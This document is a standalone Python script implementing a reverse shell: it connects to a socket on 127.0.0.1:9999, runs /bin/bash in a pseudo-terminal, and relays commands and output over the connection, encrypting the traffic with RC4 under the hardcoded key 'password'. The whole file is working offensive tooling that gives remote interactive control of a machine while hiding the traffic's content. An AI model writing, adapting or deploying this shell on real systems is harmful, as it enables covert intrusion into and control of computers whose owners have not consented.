#!/usr/bin/env python

import os
import pty
import socket
import subprocess

import select
import threading

###############################
######## RC4 Setup ############
key="password"
key = [ord(c) for c in key]
S = list(range(256))
j = 0
for i in range(256):
    j = (j + S[i] + key[i % len(key)]) % 256
    S[i], S[j] = S[j], S[i]
i = j = 0
###############################

def prga():
    global S
    global i,j
    while True:
        #print(i,j)
        #print(S)
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        next_key = S[(S[i] + S[j]) % 256]
        #print("Keystream: {}".format(next_key))
        yield next_key

def rc4(msg):
    msg = [ord(c) if not type(c) is int else c for c in msg]
    output = bytearray()
    for msgbyte, keybyte in zip(msg, prga()):
        output.append(msgbyte ^ keybyte)
    return output
    #return bytes(msgbyte ^ keybyte for msgbyte, keybyte in zip(msg, prga()) )
    #return bytes(b"".join([chr(ord(msgbyte) ^ keybyte) for msgbyte, keybyte in zip(msg, prga())]))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("127.0.0.1",9999));
s.setblocking(0)
# Spawn a PTY
master, slave = pty.openpty()
# Run bash inside it
bash = subprocess.Popen(["/bin/bash"],
                        preexec_fn=os.setsid,
                        stdin=slave,
                        stdout=slave,
                        stderr=slave,
                        universal_newlines=True)
#os.write(master, "%s\n" % FIRST_COMMAND)

def readThread(p, master, s):
    while p.poll() is None:  # While bash is alive
        r, w, e = select.select([master], [], [])  # Wait for data that is ready for sending
        if master in r:
            print("Shell has data")
            data = os.read(master, 2048)
            print("Read: {}".format(data))
            data = rc4(data)
            print("Encrypted: {}".format(data))
            print("Sending {} chars".format(len(data)))
            s.send(data)

shell_thread = threading.Thread(target=readThread, args=(bash, master, s))
shell_thread.daemon = True
shell_thread.start()

try:
    while bash.poll() is None:  # While bash is alive
        r, w, e = select.select([s], [], [])  # Wait for data on either the socket or the PTY

        if s in r:  # Reading data from the SSL socket
            print("Socket has data")
            data = ''
            try:
                data = s.recv(1024)
                #print("Read 1")
                data_left = s.recv(1024)
                #print("Read 2")
                while data_left:
                    data += data_left
                    data_left = s.recv(1024)
            except Exception as e:
                print(e)
            if not data:  # End of file.
                break
            data = rc4(data)
            print("Received {} chars".format(len(data)))
            print("Writing: {}".format(data))
            os.write(master, data)
finally:
    s.close()
